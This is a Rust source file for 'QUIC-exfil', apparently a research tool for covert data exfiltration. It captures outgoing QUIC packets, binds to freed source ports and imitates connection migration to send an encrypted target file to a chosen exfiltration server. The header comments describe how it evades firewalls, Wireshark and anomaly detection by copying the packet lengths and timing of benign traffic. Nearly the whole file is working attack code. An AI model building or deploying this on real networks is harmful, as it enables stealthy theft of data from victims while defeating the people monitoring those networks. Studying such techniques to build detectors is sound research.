//! Copyright thomasgruebl 2025
//! License: GNU GPLv3

/*
Notes:

- Only exfiltrates data when the user browses over QUIC and generates QUIC traffic immediately thereafter
- This means that the exfiltration throughput of this method depends on the user activity
- Does not create obvious packet traces like unusual DNS server names when exfiltrating data over DNS
- Mimics a real QUIC server-side connection migration by sending a data exfiltration packet with an existing DCID (and potentially getting a response from the exfiltration server if required)
- TLS (or more generally - all TCP-based connections) require a handshake if you want to establish a valid connection -> some fingerprinting tools specifically looks for TLS client hellos or TCP SYNs
- Since QUIC inherently expects such changes in the IP headers of packets without a preceding handshake -> QUIC-exfil may look less anonmalous than TLS-based exfiltration
- DNS-based data exfiltration attacks can be very low throughput if they try to avoid raising suspicion + DNS domain names have a size limitation, which is shorter than the max payload length in QUIC
- Why not establish a legit QUIC connection to exiltrate data? -> Because the "Initial" quic packet + the handshake or the 0-RTT packet are indicators of new connection establishment -> may give away too much information
    - anomaly detectors and other fingerprinting tools may specifically target handshakes to look for suspicious activity
- This method minimizes the variance between benign and malign traffic, meaning that the size of exfiltration payloads and the time deltas between two outgoing QUIC packets are chosen based on previously observed
     benign traffic. This therefore minmizes the chance of statistical outliers.
- Stateful treatment of QUIC traffic is possible at firewall level by using the QUIC traffic and version identification (see Section 4.1 https://datatracker.ietf.org/doc/html/draft-ietf-quic-manageability-08#name-connection-id-and-rebinding)
- However, connection ID might be renegotiated during communication (encrpyted) so firewall/NAT stateful tracking cannot be aware of that
- Hence, a firewall, which observes a new connection ID, cannot directly infer that a new (potentially illegitimate connection) has been established. It has to assume that the QUIC packet belongs to an existing connection that may have migrated.
- As a result, one can mimic a legitimate connection migration by observing benign QUIC traffic and replaying packets with a modified payload and redirecting them to a data exfiltration server.
- Even Wireshark cannot reliably detect QUIC if the handshake phase has not been observed. Nor can Wireshark dissect a QUIC packet after it has migrated and a change in DCID has occured.
- Anomaly Detection Features -> QUIC packet lengths, QUIC connection migration payload length, QUIC outgoing packet time deltas (inter-arrival times), and [QUIC payload entropy]
*/

mod cli;
mod encoder;
mod error;
mod parser;

use crate::cli::Cli;
use crate::encoder::{
    get_random_packetlength_sample, get_random_timedelta_sample, read_next_n_bytes,
};
use crate::error::CustomError;
use crate::parser::{Packet, QUICHeaderForm, QUICPacket, QUICPacketType};

use clap::Parser;
use encoder::encrypt_payload;
use etherparse::{PacketHeaders, PayloadSlice};
use pcap::{Capture, Device};
use rand::{prelude::*, rng};
use sha3::{Digest, Sha3_256};
use std::collections::HashMap;
use std::io;
use std::net::UdpSocket;
use std::sync::mpsc::{self, RecvError};
use std::thread;

const DIRECTION: pcap::Direction = pcap::Direction::Out;

#[derive(Debug, Clone, PartialEq)]
struct P {
    header: pcap::PacketHeader, // Here, PacketHeader contains the length of the entire packet + the timestamp
    data: Vec<u8>, // Data includes the actual packet bytes (including its protocol headers)
}

fn compute_payload_checksum(payload: &Vec<u8>) -> String {
    let mut hasher: sha3::digest::core_api::CoreWrapper<sha3::Sha3_256Core> = Sha3_256::new();
    hasher.update(payload);
    let hash = hasher.finalize();
    let hash_string: String = format!("{:x}", hash);
    println!("Payload SHA3_256 checksum: {}", hash_string);
    hash_string
}

fn compute_timedeltas_per_dcid(
    timestamps_per_dcid: &HashMap<String, Vec<f64>>,
) -> HashMap<String, Vec<f64>> {
    let mut timedeltas_per_dcid: HashMap<String, Vec<f64>> = HashMap::new();

    for (id, timestamps) in timestamps_per_dcid {
        if timestamps.len() > 1 {
            let timedeltas: Vec<f64> = timestamps
                .windows(2)
                .map(|window| ((window[1] - window[0]) * 1_000_000.0).round() / 1_000_000.0)
                .collect();
            timedeltas_per_dcid.insert(id.to_string(), timedeltas);
        } else {
            timedeltas_per_dcid.insert(id.to_string(), Vec::new());
        }
    }

    timedeltas_per_dcid
}

fn start_packet_capture(tx: &mpsc::Sender<Result<P, mpsc::RecvError>>, cli: Cli) {
    let device: Device = Device::from(cli.interface.as_str());
    println!("Using device {}", device.name);

    let mut cap: Capture<pcap::Active> = Capture::from_device(device)
        .unwrap()
        .immediate_mode(true)
        .open()
        .expect(&CustomError::NetworkError.to_string());
    let _ = cap.direction(DIRECTION);

    // only filters for outgoing QUIC connections using the default filter value
    cap.filter(cli.filter.as_str(), true).unwrap();

    while let Ok(packet) = cap.next_packet() {
        let packet_header: pcap::PacketHeader = packet.header.to_owned();
        let packet_data: Vec<u8> = packet.data.to_owned();

        let p: P = P {
            header: (packet_header),
            data: (packet_data),
        };

        // send packet to handle2 thread
        tx.send(Ok(p)).unwrap();
        dbg!("Packet sent to handle2 thread");
    }
}

fn main() {
    // parse command line arguments
    let cli: Cli = Cli::parse();

    println!("Network interface: {:?}", cli.interface);
    println!("Target file to exfiltrate: {:?}", cli.target);
    println!("Pcap capture filter: {:?}", cli.filter);
    println!("Exfiltration server destination IP: {:?}", cli.dst);
    println!("Exfiltration server destination port: {:?}", cli.port);
    println!("Packet buffer length: {:?}", cli.buffer);
    //println!("Sleep time between exfiltration packets: {:?}", cli.sleep);
    println!("Number of packets to exfiltrate: {:?}", cli.number);
    println!("\n\n");

    // stores previously observed packet lengths
    //let mut packet_lengths: Vec<u16> = Vec::new();
    let mut packet_lengths_per_dcid: HashMap<String, Vec<u16>> = HashMap::new();

    // stores previously observed timestamps (per DCID)
    let mut timestamps_per_dcid: HashMap<String, Vec<f64>> = HashMap::new();

    // stores payload SHA3-256 checksum to ignore exfiltration packets
    let mut blacklist: Vec<String> = Vec::new();

    // create streaming channel to communicate between the pcap function and the exfiltration threads
    let (tx, rx) = mpsc::channel();

    let cli_clone: Cli = cli.clone();
    let handle1: thread::JoinHandle<()> = thread::spawn(move || {
        start_packet_capture(&tx, cli_clone);
    });

    let handle2: thread::JoinHandle<_> = thread::spawn(move || {
        loop {
            dbg!("Check if your VPN is on...");

            // dummy init
            let mut data = P {
                header: (pcap::PacketHeader {
                    caplen: 1,
                    ts: libc::timeval {
                        tv_sec: 1,
                        tv_usec: 1,
                    },
                    len: 1,
                }),
                data: (Vec::from([1])),
            };

            let received: Option<Result<P, RecvError>> = match rx.recv().unwrap() {
                Ok(d) => {
                    data = d;
                    Some(Ok(data.clone()))
                }
                Err(RecvError) => Some(Err(RecvError)),
            };
            println!("{:?}", received);

            // extract timestamp from header
            let packet_timestamp: f64 =
                (data.header.ts.tv_sec as f64) + ((data.header.ts.tv_usec as f64) / 1000000.0);
            println!("Packet timestamp: {:?}", packet_timestamp);

            // dummy init
            let mut packet = PacketHeaders {
                link: (None),
                vlan: (None),
                net: (None),
                transport: (None),
                payload: (PayloadSlice::Udp(&[])),
            };
            let payload_len: usize;
            let mut quic_packet: QUICPacket = QUICPacket::default();

            if data.header.caplen > 1 {
                // send to parser
                packet = Packet::parse(&data.data).unwrap();

                // if payload is large enough, parse QUIC header
                payload_len = packet.payload.slice().len();
                if payload_len > 2 {
                    quic_packet = QUICPacket::parse_quic_header(packet.payload.clone());

                    // collect packet lengths if packet is not an exfiltration packet and if it is a short header (protected payload) packet
                    let ip_header: etherparse::NetHeaders = packet.net.unwrap();
                    if quic_packet.packet_type == QUICPacketType::ProtectedPayload
                        && quic_packet.header_type != QUICHeaderForm::LongHeader
                    {
                        if ip_header.ipv6_ref().is_some() {
                            if ip_header
                                .ipv6_ref()
                                .unwrap()
                                .0
                                .destination_addr()
                                .to_string()
                                != cli.dst
                            {
                                //packet_lengths.push(quic_packet.remaining_payload_len);
                                packet_lengths_per_dcid
                                    .entry(QUICPacket::cid_as_hex_str(quic_packet.dcid.clone()))
                                    .or_insert_with(Vec::new)
                                    .push(quic_packet.remaining_payload_len);

                                timestamps_per_dcid
                                    .entry(QUICPacket::cid_as_hex_str(quic_packet.dcid.clone()))
                                    .or_insert_with(Vec::new)
                                    .push(packet_timestamp);
                            }
                        } else {
                            let ipv4_dest: Vec<u8> =
                                ip_header.ipv4_ref().unwrap().0.destination.to_vec();
                            if ipv4_dest
                                .iter()
                                .map(|&num| num.to_string())
                                .collect::<Vec<_>>()
                                .join(".")
                                != cli.dst
                            {
                                //packet_lengths.push(quic_packet.remaining_payload_len);
                                packet_lengths_per_dcid
                                    .entry(QUICPacket::cid_as_hex_str(quic_packet.dcid.clone()))
                                    .or_insert_with(Vec::new)
                                    .push(quic_packet.remaining_payload_len);

                                timestamps_per_dcid
                                    .entry(QUICPacket::cid_as_hex_str(quic_packet.dcid.clone()))
                                    .or_insert_with(Vec::new)
                                    .push(packet_timestamp);
                            }
                        }
                    }
                }
            }

            /*println!("Packet lengths dataset size: {:?}", packet_lengths.len());
            if packet_lengths.len() < cli.buffer {
                continue;
            }*/
            let packet_count: usize = packet_lengths_per_dcid.values().map(|v| v.len()).sum();
            println!("Packet lengths dataset size: {:?}", packet_count);
            if packet_count < cli.buffer {
                continue;
            }

            let payload_checksum: String = compute_payload_checksum(&quic_packet.as_bytes());
            // IPv6     ->    //let dest: String = format!("[{}]:{}", cli.dst, cli.port); // could be enhanced by providing an array of exfiltration server IPs and rotating between them
            // IPv4:
            let dest: String = format!("{}:{}", cli.dst, cli.port); // could be enhanced by providing an array of exfiltration server IPs and rotating between them
            let udp_srcport: u16 = packet.transport.unwrap().udp().unwrap().source_port;

            // IPv6     ->    //let local_addr: String = format!("[::]:{}", udp_srcport);
            // IPv4:
            let local_addr: String = format!("0.0.0.0:{}", udp_srcport);

            // To simulate a connection migration, delay sending until old connection ID is not in use anymore -> then start exfiltrating using new destination IP and same (or new) DCID
            if !blacklist.contains(&payload_checksum) {
                let timedeltas_per_dcid: HashMap<String, Vec<f64>> =
                    compute_timedeltas_per_dcid(&timestamps_per_dcid);

                /*for (id, deltas) in &timedeltas_per_dcid {
                    println!("{}: {:?}", id, deltas);
                }*/

                // Keep looping until "successfully bound to address and port" -> connection hijacked -> start proper exfiltration on this source port.
                match UdpSocket::bind(local_addr) {
                    Ok(socket) => {
                        // here the legitimate QUIC connection has released its source port SOCKET binding
                        // we can now simulate a server-side connection migration by changing the destination IP address
                        // then we can start exfiltrating data via this connection for x number of packets / or x amount of time and subsequently discard the connection and continue via a new one
                        println!("Successfully bound to address and port");

                        let mut payloads: Vec<Vec<u8>> = Vec::new();
                        let mut pos: u64 = 0;
                        let mut i: i32 = 0;

                        // prepare the encrypted exfiltration payloads
                        while i < cli.number.try_into().unwrap() {
                            // randomly sample from previously observed packet lengths
                            //let sample: &u16 = get_random_packetlength_sample(&mut packet_lengths);
                            let default: Vec<u16> = Vec::from([28]);
                            let sample: &u16 = get_random_packetlength_sample(
                                &packet_lengths_per_dcid
                                    .get(&QUICPacket::cid_as_hex_str(quic_packet.dcid.clone()))
                                    .unwrap_or(&default),
                            );

                            // read next n bytes from target file
                            let payload: Vec<u8> =
                                read_next_n_bytes((*sample).try_into().unwrap(), &mut pos, &cli);

                            // encrypt payload using AES-256 counter mode
                            let encrypted_payload: Vec<u8> = encrypt_payload(&payload);

                            payloads.push(encrypted_payload);
                            i += 1;
                        }

                        // starting new thread handle to exfiltrate data, while remaining to listen for new socket connections on thread handle2
                        let _ = thread::spawn(move || {
                            dbg!("Exfiltrating data...");

                            // the first packet bool indicates whether a fake PATH_CHALLENGE frame should be sent or not
                            let mut first: bool = true;
                            let mut i: usize = 0;

                            // exfiltrate cli.number of packets consecutively
                            while i < cli.number.try_into().unwrap() {
                                // send packet that mimics a path validation (PATH_CHALLENGE) frame
                                // PATH_CHALLENGE frame should be at least 1200 bytes
                                if first {
                                    dbg!("Sending PATH_CHALLENGE...");
                                    let mut rng: ThreadRng = rng();
                                    let path_challenge_frame_length: usize =
                                        1350 - quic_packet.dcid_len as usize - 1; // set to simulate length of Cloudflare Quiche Connection Migration Packets
                                    let random_path_challenge_frame: Vec<u8> = (0
                                        ..path_challenge_frame_length)
                                        .map(|_| rng.random())
                                        .collect();
                                    quic_packet.remaining_payload = random_path_challenge_frame;
                                    first = false;
                                } else {
                                    dbg!("Exfiltrating using a normal protected payload packet...");
                                    quic_packet.remaining_payload = payloads[i - 1].clone();
                                }

                                i += 1;

                                // set random spin bit
                                // let bit_mask = 1 << 5;
                                // let flip = rand::thread_rng().gen_bool(0.5);
                                // if flip {
                                //    quic_packet.first_byte ^= bit_mask;
                                // }

                                // send packet
                                let _ = socket.send_to(&quic_packet.as_bytes(), &dest);

                                // Feature 3: Time Delta (i.e. inter-arrival times)
                                // Applications generate distinct traffic patterns due to differences in how they process data, which translates into unique inter-arrival times between packets

                                let program_base_rate: f64 = 0.000007;
                                let time_delta_sample = get_random_timedelta_sample(
                                    &timedeltas_per_dcid
                                        .get(&QUICPacket::cid_as_hex_str(quic_packet.dcid.clone()))
                                        .unwrap(),
                                );
                                println!(
                                    "Time delta sample for DCID {:?}, {:?}: {:?}",
                                    quic_packet.dcid,
                                    QUICPacket::cid_as_hex_str(quic_packet.dcid.clone()),
                                    time_delta_sample
                                );

                                let sleep_time: f64 = time_delta_sample - program_base_rate; // 𝑆𝑖 = Δ𝑇𝑖 − 𝐵𝑅
                                if sleep_time > 0.0 {
                                    let sleep_time_duration =
                                        std::time::Duration::try_from_secs_f64(sleep_time).unwrap();
                                    println!("Sleep time duration {:?}", sleep_time_duration);
                                    thread::sleep(
                                        std::time::Duration::try_from_secs_f64(sleep_time).unwrap(),
                                    );
                                }
                            }
                        });

                        dbg!("Sent packet.");
                    }
                    Err(e) => {
                        if e.kind() == io::ErrorKind::AddrInUse {
                            println!("Address is already in use");
                            continue;
                        } else {
                            println!("Failed to bind to address: {}", e);
                        }
                    }
                }

                blacklist.push(payload_checksum);
            } else {
                // observe base rate speed of exfiltration tool?
            }
        }
    });

    handle1.join().unwrap();
    handle2.join().unwrap();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_checksum() {
        let payload: Vec<u8> = [97, 98, 99].to_vec();
        let checksum: String = compute_payload_checksum(&payload);
        assert_eq!(
            checksum,
            "3a985da74fe225b2045c172d6bd390bd855f086e3e9d525b46bfe24511431532"
        );
    }

    #[test]
    fn test_packet_processing() {
        let (tx, rx): (
            mpsc::Sender<Result<P, String>>,
            mpsc::Receiver<Result<P, String>>,
        ) = mpsc::channel();
        let _cli: Cli = Cli {
            interface: String::from("en1"),
            dst: String::from("127.0.0.1"),
            target: String::from("images/sample.jpg"),
            filter: String::from("udp dst port 443"),
            port: String::from("443"),
            buffer: 10,
            number: 5,
            //sleep: 10,
        };

        let handle: thread::JoinHandle<()> = std::thread::spawn(move || {
            let mut packet_lengths: Vec<u16> = vec![];
            while let Ok(data) = rx.recv() {
                if let Ok(_packet) = data {
                    let quic_packet: QUICPacket = QUICPacket::default();
                    packet_lengths.push(quic_packet.remaining_payload_len);
                }
            }
        });

        let dummy_packet: P = P {
            header: pcap::PacketHeader {
                caplen: 100,
                ts: libc::timeval {
                    tv_sec: 1,
                    tv_usec: 0,
                },
                len: 100,
            },
            data: vec![0x01; 100],
        };
        tx.send(Ok(dummy_packet)).unwrap();

        std::thread::sleep(std::time::Duration::from_millis(50));
        drop(tx);

        handle.join().unwrap();
    }

    #[test]
    fn test_compute_timedeltas_per_dcid() {
        let timestamps_per_dcid = HashMap::from([
            (
                "abc".to_string(),
                Vec::from([
                    511.739858 as f64,
                    511.745279 as f64,
                    511.745281 as f64,
                    511.745283 as f64,
                ]),
            ),
            (
                "def".to_string(),
                Vec::from([
                    1736595517.639803 as f64,
                    1736595517.640406 as f64,
                    1736595517.640407 as f64,
                    1736595517.640956 as f64,
                    1736595517.744605 as f64,
                ]),
            ),
        ]);

        let timedeltas_per_id = compute_timedeltas_per_dcid(&timestamps_per_dcid);

        let abc_timedeltas = timedeltas_per_id.get("abc").unwrap();
        assert_eq!(abc_timedeltas, &vec![0.005421, 0.000002, 0.000002]);

        let def_timedeltas = timedeltas_per_id.get("def").unwrap();
        assert_eq!(
            def_timedeltas,
            &vec![0.000603, 0.000001, 0.000549, 0.103649]
        );
    }
}
